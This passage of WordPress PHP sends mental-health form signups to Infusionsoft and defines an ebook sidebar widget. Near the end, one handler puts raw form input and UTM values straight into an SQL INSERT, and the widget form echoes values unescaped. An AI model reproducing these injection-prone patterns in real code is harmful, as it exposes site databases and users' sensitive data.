						        $callname = "HappinessHome";
						        $apicallreturn = $objInfusion->apiCall($integration,$callname,$contactId);
           					} 





				 } //end of entry form 10 loop

				  //new MindFullNess form no 9 - 17-04-2020 

				  if($entry["form_id"] == "9")

				 {
						$first_name = rgar( $entry, '1' );
						$last_name = rgar( $entry, '5' );
						$email = rgar( $entry, '2' );
						$phone = rgar( $entry, '3' );
						//$business_name = rgar( $entry , '6');


						     $arrParams=[];
          					 $arrParams['firstName']=$first_name;
           					 $arrParams['email']=$email;
           					 $arrFoundByEmail=$objInfusion->searchByEmailAndFName($arrParams);


           					  //for sending the data in infusion soft
           					  $arrInfContact['FirstName']=trim($first_name);
           					  $arrInfContact['LastName'] = trim($last_name);
           					  $arrInfContact['Email']=trim($email);
           					  $arrInfContact['Phone1']=trim($phone);
           					  //$arrInfContact['Company']=trim($business_name);


           					   $contactId="";
					        if(count($arrFoundByEmail)>0)
					        {
					            // Update
					            $objFoundContact=$arrFoundByEmail[0];
					            $contactId=$objFoundContact->Id;

					            if($objInfusion->updateContact($contactId,$arrInfContact))
					            {
						           //echo "contact updated";
					            }
					            else
					            {
					                //echo "Updated-Failed";   
					            }
					        }
					        else
					        {
					            // Insert
					            $contactId=$objInfusion->createContact($arrInfContact);
					            if($contactId)
					            {
					                // echo "contact created";
					            }
					            else
					            {
					                //echo "Insert-Failed";   
					            }

					        }
           					 
           					if($contactId!="")
           					{
           						$integration = "form";
						        $callname = "freemindfulnessProgram";
						        $apicallreturn = $objInfusion->apiCall($integration,$callname,$contactId);
           					} 





				 } //end of entry form 9 loop


				  //new Membership login form no 19 - 10-06-2020 

				  if($entry["form_id"] == "19")

				 {
						$first_name = rgar( $entry, '1.3' );
						$last_name = rgar( $entry, '1.6' );
						$email = rgar( $entry, '2' );
						$phone = rgar( $entry, '3' );
						//$business_name = rgar( $entry , '6');


						     $arrParams=[];
          					 $arrParams['firstName']=$first_name;
           					 $arrParams['email']=$email;
           					 $arrFoundByEmail=$objInfusion->searchByEmailAndFName($arrParams);


           					  //for sending the data in infusion soft
           					  $arrInfContact['FirstName']=trim($first_name);
           					  $arrInfContact['LastName'] = trim($last_name);
           					  $arrInfContact['Email']=trim($email);
           					  $arrInfContact['Phone1']=trim($phone);
           					  //$arrInfContact['Company']=trim($business_name);


           					   $contactId="";
					        if(count($arrFoundByEmail)>0)
					        {
					            // Update
					            $objFoundContact=$arrFoundByEmail[0];
					            $contactId=$objFoundContact->Id;

					            if($objInfusion->updateContact($contactId,$arrInfContact))
					            {
						           //echo "contact updated";
					            }
					            else
					            {
					                //echo "Updated-Failed";   
					            }
					        }
					        else
					        {
					            // Insert
					            $contactId=$objInfusion->createContact($arrInfContact);
					            if($contactId)
					            {
					                // echo "contact created";
					            }
					            else
					            {
					                //echo "Insert-Failed";   
					            }

					        }
           					 
           					if($contactId!="")
           					{
           						$integration = "form";
						        $callname = "membershipwaitinglist";
						        $apicallreturn = $objInfusion->apiCall($integration,$callname,$contactId);
           					} 





				 } //end of entry form 19 loop


				  //new anger form no 20 - 06-07-2020 

				  if($entry["form_id"] == "20")

				 {
						$first_name = rgar( $entry, '1' );
						$last_name = rgar( $entry, '2' );
						$email = rgar( $entry, '3' );
						$phone = rgar( $entry, '4' );
						//$business_name = rgar( $entry , '6');


						     $arrParams=[];
          					 $arrParams['firstName']=$first_name;
           					 $arrParams['email']=$email;
           					 $arrFoundByEmail=$objInfusion->searchByEmailAndFName($arrParams);


           					  //for sending the data in infusion soft
           					  $arrInfContact['FirstName']=trim($first_name);
           					  $arrInfContact['LastName'] = trim($last_name);
           					  $arrInfContact['Email']=trim($email);
           					  $arrInfContact['Phone1']=trim($phone);
           					  //$arrInfContact['Company']=trim($business_name);


           					   $contactId="";
					        if(count($arrFoundByEmail)>0)
					        {
					            // Update
					            $objFoundContact=$arrFoundByEmail[0];
					            $contactId=$objFoundContact->Id;

					            if($objInfusion->updateContact($contactId,$arrInfContact))
					            {
						           //echo "contact updated";
					            }
					            else
					            {
					                //echo "Updated-Failed";   
					            }
					        }
					        else
					        {
					            // Insert
					            $contactId=$objInfusion->createContact($arrInfContact);
					            if($contactId)
					            {
					                // echo "contact created";
					            }
					            else
					            {
					                //echo "Insert-Failed";   
					            }

					        }
           					 
           					if($contactId!="")
           					{
           						$integration = "form";
						        $callname = "Angerebook";
						        $apicallreturn = $objInfusion->apiCall($integration,$callname,$contactId);
           					} 





				 } //end of entry form 20 loop

				 //New Services Form  - 09-09-2020

				 //INTRODUCTORY OFFER Anger form no 25 - 09-09-2020 

				 if($entry["form_id"] == "25")

				 {
							$first_name = rgar( $entry, '2' );
							$email = rgar( $entry, '3' );
							$phone = rgar( $entry, '4' );
							//$business_name = rgar( $entry , '6');


						     $arrParams=[];
          					 $arrParams['firstName']=$first_name;
           					 $arrParams['email']=$email;
           					 $arrFoundByEmail=$objInfusion->searchByEmailAndFName($arrParams);


           					  //for sending the data in infusion soft
           					  $arrInfContact['FirstName']=trim($first_name);
           					 // $arrInfContact['LastName'] = trim($last_name);
           					  $arrInfContact['Email']=trim($email);
           					  $arrInfContact['Phone1']=trim($phone);
           					  //$arrInfContact['Company']=trim($business_name);


           					$contactId="";
					        if(count($arrFoundByEmail)>0)
					        {
					            // Update
					            $objFoundContact=$arrFoundByEmail[0];
					            $contactId=$objFoundContact->Id;

					            if($objInfusion->updateContact($contactId,$arrInfContact))
					            {
						           //echo "contact updated";
					            }
					            else
					            {
					                //echo "Updated-Failed";   
					            }
					        }
					        else
					        {
					            // Insert
					            $contactId=$objInfusion->createContact($arrInfContact);
					            if($contactId)
					            {
					                // echo "contact created";
					            }
					            else
					            {
					                //echo "Insert-Failed";   
					            }

					        }
           					 
           					if($contactId!="")
           					{
           						$integration = "form";
						        $callname = "anger";
						        $apicallreturn = $objInfusion->apiCall($integration,$callname,$contactId);
           					} 





				 } //end of entry form 25 loop

				  //INTRODUCTORY OFFER Anxiety form no 35 - 09-09-2020 

				 if($entry["form_id"] == "35")

				 {
							$first_name = rgar( $entry, '2' );
							$email = rgar( $entry, '3' );
							$phone = rgar( $entry, '4' );
							//$business_name = rgar( $entry , '6');


						     $arrParams=[];
          					 $arrParams['firstName']=$first_name;
           					 $arrParams['email']=$email;
           					 $arrFoundByEmail=$objInfusion->searchByEmailAndFName($arrParams);


           					  //for sending the data in infusion soft
           					  $arrInfContact['FirstName']=trim($first_name);
           					 // $arrInfContact['LastName'] = trim($last_name);
           					  $arrInfContact['Email']=trim($email);
           					  $arrInfContact['Phone1']=trim($phone);
           					  //$arrInfContact['Company']=trim($business_name);


           					$contactId="";
					        if(count($arrFoundByEmail)>0)
					        {
					            // Update
					            $objFoundContact=$arrFoundByEmail[0];
					            $contactId=$objFoundContact->Id;

					            if($objInfusion->updateContact($contactId,$arrInfContact))
					            {
						           //echo "contact updated";
					            }
					            else
					            {
					                //echo "Updated-Failed";   
					            }
					        }
					        else
					        {
					            // Insert
					            $contactId=$objInfusion->createContact($arrInfContact);
					            if($contactId)
					            {
					                // echo "contact created";
					            }
					            else
					            {
					                //echo "Insert-Failed";   
					            }

					        }
           					 
           					if($contactId!="")
           					{
           						$integration = "form";
						        $callname = "anxiety";
						        $apicallreturn = $objInfusion->apiCall($integration,$callname,$contactId);
           					} 





				 } //end of entry form 35 loop


				   //INTRODUCTORY OFFER Depression form no 26 - 09-09-2020 

				 if($entry["form_id"] == "26")

				 {
							$first_name = rgar( $entry, '2' );
							$email = rgar( $entry, '3' );
							$phone = rgar( $entry, '4' );
							//$business_name = rgar( $entry , '6');


						     $arrParams=[];
          					 $arrParams['firstName']=$first_name;
           					 $arrParams['email']=$email;
           					 $arrFoundByEmail=$objInfusion->searchByEmailAndFName($arrParams);


           					  //for sending the data in infusion soft
           					  $arrInfContact['FirstName']=trim($first_name);
           					  //$arrInfContact['LastName'] = trim($last_name);
           					  $arrInfContact['Email']=trim($email);
           					  $arrInfContact['Phone1']=trim($phone);
           					  //$arrInfContact['Company']=trim($business_name);


           					$contactId="";
					        if(count($arrFoundByEmail)>0)
					        {
					            // Update
					            $objFoundContact=$arrFoundByEmail[0];
					            $contactId=$objFoundContact->Id;

					            if($objInfusion->updateContact($contactId,$arrInfContact))
					            {
						           //echo "contact updated";
					            }
					            else
					            {
					                //echo "Updated-Failed";   
					            }
					        }
					        else
					        {
					            // Insert
					            $contactId=$objInfusion->createContact($arrInfContact);
					            if($contactId)
					            {
					                // echo "contact created";
					            }
					            else
					            {
					                //echo "Insert-Failed";   
					            }

					        }
           					 
           					if($contactId!="")
           					{
           						$integration = "form";
						        $callname = "depression";
						        $apicallreturn = $objInfusion->apiCall($integration,$callname,$contactId);
           					} 





				 } //end of entry form 26 loop

				  //INTRODUCTORY OFFER Bipolar form no 27 - 09-09-2020 

				 if($entry["form_id"] == "27")

				 {
							$first_name = rgar( $entry, '2' );
							$email = rgar( $entry, '3' );
							$phone = rgar( $entry, '4' );
							//$business_name = rgar( $entry , '6');


						     $arrParams=[];
          					 $arrParams['firstName']=$first_name;
           					 $arrParams['email']=$email;
           					 $arrFoundByEmail=$objInfusion->searchByEmailAndFName($arrParams);


           					  //for sending the data in infusion soft
           					  $arrInfContact['FirstName']=trim($first_name);
           					  //$arrInfContact['LastName'] = trim($last_name);
           					  $arrInfContact['Email']=trim($email);
           					  $arrInfContact['Phone1']=trim($phone);
           					  //$arrInfContact['Company']=trim($business_name);


           					$contactId="";
					        if(count($arrFoundByEmail)>0)
					        {
					            // Update
					            $objFoundContact=$arrFoundByEmail[0];
					            $contactId=$objFoundContact->Id;

					            if($objInfusion->updateContact($contactId,$arrInfContact))
					            {
						           //echo "contact updated";
					            }
					            else
					            {
					                //echo "Updated-Failed";   
					            }
					        }
					        else
					        {
					            // Insert
					            $contactId=$objInfusion->createContact($arrInfContact);
					            if($contactId)
					            {
					                // echo "contact created";
					            }
					            else
					            {
					                //echo "Insert-Failed";   
					            }

					        }
           					 
           					if($contactId!="")
           					{
           						$integration = "form";
						        $callname = "bipolar";
						        $apicallreturn = $objInfusion->apiCall($integration,$callname,$contactId);
           					} 





				 } //end of entry form 27 loop


				   //INTRODUCTORY OFFER Borderline Personality Disorder form no 28 - 09-09-2020 

				 if($entry["form_id"] == "28")

				 {
							$first_name = rgar( $entry, '2' );
							$email = rgar( $entry, '3' );
							$phone = rgar( $entry, '4' );
							//$business_name = rgar( $entry , '6');


						     $arrParams=[];
          					 $arrParams['firstName']=$first_name;
           					 $arrParams['email']=$email;
           					 $arrFoundByEmail=$objInfusion->searchByEmailAndFName($arrParams);


           					  //for sending the data in infusion soft
           					  $arrInfContact['FirstName']=trim($first_name);
           					  //$arrInfContact['LastName'] = trim($last_name);
           					  $arrInfContact['Email']=trim($email);
           					  $arrInfContact['Phone1']=trim($phone);
           					  //$arrInfContact['Company']=trim($business_name);


           					$contactId="";
					        if(count($arrFoundByEmail)>0)
					        {
					            // Update
					            $objFoundContact=$arrFoundByEmail[0];
					            $contactId=$objFoundContact->Id;

					            if($objInfusion->updateContact($contactId,$arrInfContact))
					            {
						           //echo "contact updated";
					            }
					            else
					            {
					                //echo "Updated-Failed";   
					            }
					        }
					        else
					        {
					            // Insert
					            $contactId=$objInfusion->createContact($arrInfContact);
					            if($contactId)
					            {
					                // echo "contact created";
					            }
					            else
					            {
					                //echo "Insert-Failed";   
					            }

					        }
           					 
           					if($contactId!="")
           					{
           						$integration = "form";
						        $callname = "personalityDisorder";
						        $apicallreturn = $objInfusion->apiCall($integration,$callname,$contactId);
           					} 





				 } //end of entry form 28 loop

				  //INTRODUCTORY OFFER Burnout form no 29 - 09-09-2020 

				 if($entry["form_id"] == "29")

				 {
							$first_name = rgar( $entry, '2' );
							$email = rgar( $entry, '3' );
							$phone = rgar( $entry, '4' );
							//$business_name = rgar( $entry , '6');


						     $arrParams=[];
          					 $arrParams['firstName']=$first_name;
           					 $arrParams['email']=$email;
           					 $arrFoundByEmail=$objInfusion->searchByEmailAndFName($arrParams);


           					  //for sending the data in infusion soft
           					  $arrInfContact['FirstName']=trim($first_name);
           					  //$arrInfContact['LastName'] = trim($last_name);
           					  $arrInfContact['Email']=trim($email);
           					  $arrInfContact['Phone1']=trim($phone);
           					  //$arrInfContact['Company']=trim($business_name);


           					$contactId="";
					        if(count($arrFoundByEmail)>0)
					        {
					            // Update
					            $objFoundContact=$arrFoundByEmail[0];
					            $contactId=$objFoundContact->Id;

					            if($objInfusion->updateContact($contactId,$arrInfContact))
					            {
						           //echo "contact updated";
					            }
					            else
					            {
					                //echo "Updated-Failed";   
					            }
					        }
					        else
					        {
					            // Insert
					            $contactId=$objInfusion->createContact($arrInfContact);
					            if($contactId)
					            {
					                // echo "contact created";
					            }
					            else
					            {
					                //echo "Insert-Failed";   
					            }

					        }
           					 
           					if($contactId!="")
           					{
           						$integration = "form";
						        $callname = "burnout";
						        $apicallreturn = $objInfusion->apiCall($integration,$callname,$contactId);
           					} 





				 } //end of entry form 29 loop

				   //INTRODUCTORY OFFER Insomnia form no 30 - 09-09-2020 

				 if($entry["form_id"] == "30")

				 {
							$first_name = rgar( $entry, '2' );
							$email = rgar( $entry, '3' );
							$phone = rgar( $entry, '4' );
							//$business_name = rgar( $entry , '6');


						     $arrParams=[];
          					 $arrParams['firstName']=$first_name;
           					 $arrParams['email']=$email;
           					 $arrFoundByEmail=$objInfusion->searchByEmailAndFName($arrParams);


           					  //for sending the data in infusion soft
           					  $arrInfContact['FirstName']=trim($first_name);
           					  //$arrInfContact['LastName'] = trim($last_name);
           					  $arrInfContact['Email']=trim($email);
           					  $arrInfContact['Phone1']=trim($phone);
           					  //$arrInfContact['Company']=trim($business_name);


           					$contactId="";
					        if(count($arrFoundByEmail)>0)
					        {
					            // Update
					            $objFoundContact=$arrFoundByEmail[0];
					            $contactId=$objFoundContact->Id;

					            if($objInfusion->updateContact($contactId,$arrInfContact))
					            {
						           //echo "contact updated";
					            }
					            else
					            {
					                //echo "Updated-Failed";   
					            }
					        }
					        else
					        {
					            // Insert
					            $contactId=$objInfusion->createContact($arrInfContact);
					            if($contactId)
					            {
					                // echo "contact created";
					            }
					            else
					            {
					                //echo "Insert-Failed";   
					            }

					        }
           					 
           					if($contactId!="")
           					{
           						$integration = "form";
						        $callname = "insomnia";
						        $apicallreturn = $objInfusion->apiCall($integration,$callname,$contactId);
           					} 





				 } //end of entry form 30 loop

				  //INTRODUCTORY OFFER Post Natal Depression form no 32 - 09-09-2020 

				 if($entry["form_id"] == "32")

				 {
							$first_name = rgar( $entry, '2' );
							$email = rgar( $entry, '3' );
							$phone = rgar( $entry, '4' );
							//$business_name = rgar( $entry , '6');


						     $arrParams=[];
          					 $arrParams['firstName']=$first_name;
           					 $arrParams['email']=$email;
           					 $arrFoundByEmail=$objInfusion->searchByEmailAndFName($arrParams);


           					  //for sending the data in infusion soft
           					  $arrInfContact['FirstName']=trim($first_name);
           					  //$arrInfContact['LastName'] = trim($last_name);
           					  $arrInfContact['Email']=trim($email);
           					  $arrInfContact['Phone1']=trim($phone);
           					  //$arrInfContact['Company']=trim($business_name);


           					$contactId="";
					        if(count($arrFoundByEmail)>0)
					        {
					            // Update
					            $objFoundContact=$arrFoundByEmail[0];
					            $contactId=$objFoundContact->Id;

					            if($objInfusion->updateContact($contactId,$arrInfContact))
					            {
						           //echo "contact updated";
					            }
					            else
					            {
					                //echo "Updated-Failed";   
					            }
					        }
					        else
					        {
					            // Insert
					            $contactId=$objInfusion->createContact($arrInfContact);
					            if($contactId)
					            {
					                // echo "contact created";
					            }
					            else
					            {
					                //echo "Insert-Failed";   
					            }

					        }
           					 
           					if($contactId!="")
           					{
           						$integration = "form";
						        $callname = "postNatalDepression";
						        $apicallreturn = $objInfusion->apiCall($integration,$callname,$contactId);
           					} 





				 } //end of entry form 32 loop

				   //INTRODUCTORY OFFER Post Traumatic Stress form no 31 - 09-09-2020 

				 if($entry["form_id"] == "31")

				 {
							$first_name = rgar( $entry, '2' );
							$email = rgar( $entry, '3' );
							$phone = rgar( $entry, '4' );
							//$business_name = rgar( $entry , '6');


						     $arrParams=[];
          					 $arrParams['firstName']=$first_name;
           					 $arrParams['email']=$email;
           					 $arrFoundByEmail=$objInfusion->searchByEmailAndFName($arrParams);


           					  //for sending the data in infusion soft
           					  $arrInfContact['FirstName']=trim($first_name);
           					  //$arrInfContact['LastName'] = trim($last_name);
           					  $arrInfContact['Email']=trim($email);
           					  $arrInfContact['Phone1']=trim($phone);
           					  //$arrInfContact['Company']=trim($business_name);


           					$contactId="";
					        if(count($arrFoundByEmail)>0)
					        {
					            // Update
					            $objFoundContact=$arrFoundByEmail[0];
					            $contactId=$objFoundContact->Id;

					            if($objInfusion->updateContact($contactId,$arrInfContact))
					            {
						           //echo "contact updated";
					            }
					            else
					            {
					                //echo "Updated-Failed";   
					            }
					        }
					        else
					        {
					            // Insert
					            $contactId=$objInfusion->createContact($arrInfContact);
					            if($contactId)
					            {
					                // echo "contact created";
					            }
					            else
					            {
					                //echo "Insert-Failed";   
					            }

					        }
           					 
           					if($contactId!="")
           					{
           						$integration = "form";
						        $callname = "postTraumaticStress";
						        $apicallreturn = $objInfusion->apiCall($integration,$callname,$contactId);
           					} 





				 } //end of entry form 31 loop


				   //INTRODUCTORY OFFER Self Esteem & Confidence form no 24 - 09-09-2020 

				 if($entry["form_id"] == "24")

				 {
							$first_name = rgar( $entry, '2' );
							$email = rgar( $entry, '3' );
							$phone = rgar( $entry, '4' );
							//$business_name = rgar( $entry , '6');


						     $arrParams=[];
          					 $arrParams['firstName']=$first_name;
           					 $arrParams['email']=$email;
           					 $arrFoundByEmail=$objInfusion->searchByEmailAndFName($arrParams);


           					  //for sending the data in infusion soft
           					  $arrInfContact['FirstName']=trim($first_name);
           					  //$arrInfContact['LastName'] = trim($last_name);
           					  $arrInfContact['Email']=trim($email);
           					  $arrInfContact['Phone1']=trim($phone);
           					  //$arrInfContact['Company']=trim($business_name);


           					$contactId="";
					        if(count($arrFoundByEmail)>0)
					        {
					            // Update
					            $objFoundContact=$arrFoundByEmail[0];
					            $contactId=$objFoundContact->Id;

					            if($objInfusion->updateContact($contactId,$arrInfContact))
					            {
						           //echo "contact updated";
					            }
					            else
					            {
					                //echo "Updated-Failed";   
					            }
					        }
					        else
					        {
					            // Insert
					            $contactId=$objInfusion->createContact($arrInfContact);
					            if($contactId)
					            {
					                // echo "contact created";
					            }
					            else
					            {
					                //echo "Insert-Failed";   
					            }

					        }
           					 
           					if($contactId!="")
           					{
           						$integration = "form";
						        $callname = "selfEsteem";
						        $apicallreturn = $objInfusion->apiCall($integration,$callname,$contactId);
           					} 





				 } //end of entry form 24 loop

				    //INTRODUCTORY OFFER Stress form no 33 - 09-09-2020 

				 if($entry["form_id"] == "33")

				 {
							$first_name = rgar( $entry, '2' );
							$email = rgar( $entry, '3' );
							$phone = rgar( $entry, '4' );
							//$business_name = rgar( $entry , '6');


						     $arrParams=[];
          					 $arrParams['firstName']=$first_name;
           					 $arrParams['email']=$email;
           					 $arrFoundByEmail=$objInfusion->searchByEmailAndFName($arrParams);


           					  //for sending the data in infusion soft
           					  $arrInfContact['FirstName']=trim($first_name);
           					  //$arrInfContact['LastName'] = trim($last_name);
           					  $arrInfContact['Email']=trim($email);
           					  $arrInfContact['Phone1']=trim($phone);
           					  //$arrInfContact['Company']=trim($business_name);


           					$contactId="";
					        if(count($arrFoundByEmail)>0)
					        {
					            // Update
					            $objFoundContact=$arrFoundByEmail[0];
					            $contactId=$objFoundContact->Id;

					            if($objInfusion->updateContact($contactId,$arrInfContact))
					            {
						           //echo "contact updated";
					            }
					            else
					            {
					                //echo "Updated-Failed";   
					            }
					        }
					        else
					        {
					            // Insert
					            $contactId=$objInfusion->createContact($arrInfContact);
					            if($contactId)
					            {
					                // echo "contact created";
					            }
					            else
					            {
					                //echo "Insert-Failed";   
					            }

					        }
           					 
           					if($contactId!="")
           					{
           						$integration = "form";
						        $callname = "stress";
						        $apicallreturn = $objInfusion->apiCall($integration,$callname,$contactId);
           					} 





				 } //end of entry form 33 loop

				 //INTRODUCTORY OFFER Drug Addiction form no 34 - 09-09-2020 

				 if($entry["form_id"] == "34")

				 {
							$first_name = rgar( $entry, '2' );
							$email = rgar( $entry, '3' );
							$phone = rgar( $entry, '4' );
							//$business_name = rgar( $entry , '6');


						     $arrParams=[];
          					 $arrParams['firstName']=$first_name;
           					 $arrParams['email']=$email;
           					 $arrFoundByEmail=$objInfusion->searchByEmailAndFName($arrParams);


           					  //for sending the data in infusion soft
           					  $arrInfContact['FirstName']=trim($first_name);
           					  //$arrInfContact['LastName'] = trim($last_name);
           					  $arrInfContact['Email']=trim($email);
           					  $arrInfContact['Phone1']=trim($phone);
           					  //$arrInfContact['Company']=trim($business_name);


           					$contactId="";
					        if(count($arrFoundByEmail)>0)
					        {
					            // Update
					            $objFoundContact=$arrFoundByEmail[0];
					            $contactId=$objFoundContact->Id;

					            if($objInfusion->updateContact($contactId,$arrInfContact))
					            {
						           //echo "contact updated";
					            }
					            else
					            {
					                //echo "Updated-Failed";   
					            }
					        }
					        else
					        {
					            // Insert
					            $contactId=$objInfusion->createContact($arrInfContact);
					            if($contactId)
					            {
					                // echo "contact created";
					            }
					            else
					            {
					                //echo "Insert-Failed";   
					            }

					        }
           					 
           					if($contactId!="")
           					{
           						$integration = "form";
						        $callname = "drugAddiction";
						        $apicallreturn = $objInfusion->apiCall($integration,$callname,$contactId);
           					} 





				 } //end of entry form 34 loop


				  //Contact Us form no 41 - 07-10-2020 

				 if($entry["form_id"] == "41")

				 {
							$first_name = rgar( $entry, '1' );
							$email = rgar( $entry, '2' );
							$phone = rgar( $entry, '3' );
							$type_of_service = rgar($entry , '4');
							$message_contact = rgar($entry , '5');
							//$business_name = rgar( $entry , '6');


						     $arrParams=[];
          					 $arrParams['firstName']=$first_name;
           					 $arrParams['email']=$email;
           					 $arrFoundByEmail=$objInfusion->searchByEmailAndFName($arrParams);


           					  //for sending the data in infusion soft
           					  $arrInfContact['FirstName']=trim($first_name);
           					  //$arrInfContact['LastName'] = trim($last_name);
           					  $arrInfContact['Email']=trim($email);
           					  $arrInfContact['Phone1']=trim($phone);
           					  $arrInfContact['_TypeofService']=trim($type_of_service);
           					  $arrInfContact['_Message']=trim($message_contact);
           					  //$arrInfContact['Company']=trim($business_name);


           					$contactId="";
					        if(count($arrFoundByEmail)>0)
					        {
					            // Update
					            $objFoundContact=$arrFoundByEmail[0];
					            $contactId=$objFoundContact->Id;

					            if($objInfusion->updateContact($contactId,$arrInfContact))
					            {
						           //echo "contact updated";
					            }
					            else
					            {
					                //echo "Updated-Failed";   
					            }
					        }
					        else
					        {
					            // Insert
					            $contactId=$objInfusion->createContact($arrInfContact);
					            if($contactId)
					            {
					                // echo "contact created";
					            }
					            else
					            {
					                //echo "Insert-Failed";   
					            }

					        }
           					 
           					if($contactId!="")
           					{
           						$integration = "form";
						        $callname = "contactus";
						        $apicallreturn = $objInfusion->apiCall($integration,$callname,$contactId);
           					}





				 } //end of entry form 41 loop


				 //Contact Us form no 43 - 29-01-2021 

				 if($entry["form_id"] == "43" || $entry["form_id"] == "44")

				 {
							$first_name = rgar( $entry, '1' );
							$email = rgar( $entry, '2' );
							$phone = rgar( $entry, '3' );
							//$business_name = rgar( $entry , '6');
							$utm_campaign = rgar( $entry, '4');
							$utm_source = rgar($entry, '5');
							$utm_term = rgar( $entry, '6');
							$utm_medium = rgar ($entry , '7');
							$utm_content = rgar( $entry, '8');
							$fbclid = rgar( $entry,'9');
							$gclid = rgar($entry, '10');


						     $arrParams=[];
          					 $arrParams['firstName']=$first_name;
           					 $arrParams['email']=$email;
           					 $arrFoundByEmail=$objInfusion->searchByEmailAndFName($arrParams);


           					  //for sending the data in infusion soft
           					  $arrInfContact['FirstName']=trim($first_name);
           					  //$arrInfContact['LastName'] = trim($last_name);
           					  $arrInfContact['Email']=trim($email);
           					  $arrInfContact['Phone1']=trim($phone);
           					  //$arrInfContact['Company']=trim($business_name);


           					$contactId="";
					        if(count($arrFoundByEmail)>0)
					        {
					            // Update
					            $objFoundContact=$arrFoundByEmail[0];
					            $contactId=$objFoundContact->Id;

					            if($objInfusion->updateContact($contactId,$arrInfContact))
					            {
						           //echo "contact updated";
					            }
					            else
					            {
					                //echo "Updated-Failed";   
					            }
					        }
					        else
					        {
					            // Insert
					            $contactId=$objInfusion->createContact($arrInfContact);
					            if($contactId)
					            {
					                // echo "contact created";
					            }
					            else
					            {
					                //echo "Insert-Failed";   
					            }

					        }
           					 
           					if($contactId!="")
           					{
           						$integration = "form";
						        $callname = "experiencesession";
						        $apicallreturn = $objInfusion->apiCall($integration,$callname,$contactId);
						        $api_call_success=0;
				                $api_call_response=json_encode($apicallreturn);
				                if(isset($apicallreturn[0]['success']))
				                {

				                    $api_call_success=$apicallreturn[0]['success'];
				                    global $wpdb;
				                    $now_time = date("Y-m-d H:i:s");
				                    $exp_time = date("Y-m-d H:i:s", strtotime('+2 day'));
				                   // $exp_time = date('Y-m-d H:i:s', strtotime($now_time . ' + 72 hours'));
				                   // $exp_time_2 = date($exp_time,strtotime('-24 hours'));
				                    $sql = "INSERT INTO membership_exp_audio (first_name,email,phone,api_call_success,api_call_response,created_time,exp_time,utm_campaign,utm_source,utm_term,utm_medium,utm_content,fbclid,gclid) values ('$first_name', '$email', '$phone', '$api_call_success', '$api_call_response','$now_time','$exp_time','$utm_campaign','$utm_source','$utm_term','$utm_medium','$utm_content','$fbclid','$gclid')";
				                    $wpdb->query($sql);

				                }
           					}





				 } //end of entry form 43 loop



			




		} // end of main function




class Download_Ebook_widget extends WP_Widget {

	function __construct() {
		parent::__construct(
		  
		// Base ID of your widget
		'Download_Ebook_widget', 
		  
		// Widget name will appear in UI
		__('BWS Download Ebook Widget', 'Download_Ebook_widget_domain'), 
		  
		// Widget description
		array( 'description' => __( 'Download Ebook Widget', 'Download_Ebook_widget_domain' ), ) 
		);
	}

	function widget($args, $instance) {
		global $post;
        echo $before_widget;

        $category = "";
        if(!empty(get_the_category($post->ID)[0]->slug) && get_the_category($post->ID)[0]->slug != 'uncategorised'){
        	$category = get_the_category($post->ID)[0]->slug;
        } else{
        	$category = "happiness";
        }
?>

	<div class="grid-x grid-margin-x grid-margin-y sidebar-cta">
				<div class="cell item large-12 medium-12 small-12">
					<div class="grid-x">
						<div class="cell large-12 item">
							<img src="<?php echo esc_url($instance['image_uri']);?>" style="width:100%;"/>
							<div class="inner">								
								<p><?php echo apply_filters('widget_title', $instance['text'] ); ?></p>
								<p><strong><?php echo apply_filters('widget_title', $instance['sub_text'] ); ?></strong></p>
							</div>													
						</div>
						<div class="cell large-12">
							<a data-open="<?php echo $category;?>-ebook-modal" aria-controls="ebook-modal" aria-haspopup="true" tabindex="0" class="button"><?php echo apply_filters('widget_title', $instance['button_text'] ); ?></a>
						</div>
					</div>
				</div>
			</div>

			<div class="large reveal reveal-video" id="<?php echo $category;?>-ebook-modal" data-reveal data-reset-on-close="false" data-animation-in="fade-in" data-animation-out="fade-out" data-options="closeOnClick:false;" style="max-width: 500px;">
   <a aria-label="Close modal" class="close-modal-link" aria-label="Dismiss alert" data-close>×</a>
<div class="form-wrapper">
	
<h3>Download Free Ebook</h3>

<?php

$post_cat = get_the_category($post->ID)[0]->slug; 

$ebook_download_forms = get_field('ebook_download_forms','option');

foreach($ebook_download_forms as $ebook){

	if($post_cat == strtolower($ebook['title'])){
		echo do_shortcode($ebook["shortcode"]);
	}
}

if($post_cat == 'uncategorised' || empty($post_cat)){
	foreach($ebook_download_forms as $ebook){

		if('happiness' == strtolower($ebook['title'])){
			echo do_shortcode($ebook["shortcode"]);
		}
	}
}

?>

<?php //echo the_sub_field('form');?>
						
						
				</div>     
</div> 

<?php
        echo $after_widget;

    }

    function update($new_instance, $old_instance) {
        $instance = $old_instance;
        $instance['text'] = strip_tags( $new_instance['text'] );
        $instance['sub_text'] = strip_tags( $new_instance['sub_text'] );
        $instance['button_text'] = strip_tags( $new_instance['button_text'] );
        $instance['image_uri'] = strip_tags( $new_instance['image_uri'] );
        return $instance;
    }

    

	function form($instance) {
?>

    <p>
        <label for="<?php echo $this->get_field_id('text'); ?>">Title</label><br />
        <input type="text" name="<?php echo $this->get_field_name('text'); ?>" id="<?php echo $this->get_field_id('text'); ?>" value="<?php echo $instance['text']; ?>" class="widefat" />
    </p>
    <p>
        <label for="<?php echo $this->get_field_id('sub_text'); ?>">Sub Title</label><br />
        <input type="text" name="<?php echo $this->get_field_name('sub_text'); ?>" id="<?php echo $this->get_field_id('sub_text'); ?>" value="<?php echo $instance['sub_text']; ?>" class="widefat" />
    </p>
    <p>
        <label for="<?php echo $this->get_field_id('button_text'); ?>">CTA Button Text</label><br />
        <input type="text" name="<?php echo $this->get_field_name('button_text'); ?>" id="<?php echo $this->get_field_id('button_text'); ?>" value="<?php echo $instance['button_text']; ?>" class="widefat" />
    </p>
    <p>
        <label for="<?= $this->get_field_id( 'image_uri' ); ?>">Image</label>
        <img class="<?= $this->id ?>_img" src="<?= (!empty($instance['image_uri'])) ? $instance['image_uri'] : ''; ?>" style="margin:0;padding:0;max-width:100%;display:block"/>
        <input type="hidden" class="widefat <?= $this->id ?>_url" name="<?= $this->get_field_name( 'image_uri' ); ?>" value="<?= $instance['image_uri']; ?>" style="margin-top:5px;" />
        <input type="button" id="<?= $this->id ?>" class="button button-primary js_custom_upload_media" value="Upload Image" style="margin-top:5px;" />
    </p>
    <script type="text/javascript">
    		    	jQuery(document).ready(function ($) {
  function media_upload(button_selector) {
    var _custom_media = true,
        _orig_send_attachment = wp.media.editor.send.attachment;
    $('body').on('click', button_selector, function () {
      var button_id = $(this).attr('id');
      wp.media.editor.send.attachment = function (props, attachment) {
        if (_custom_media) {
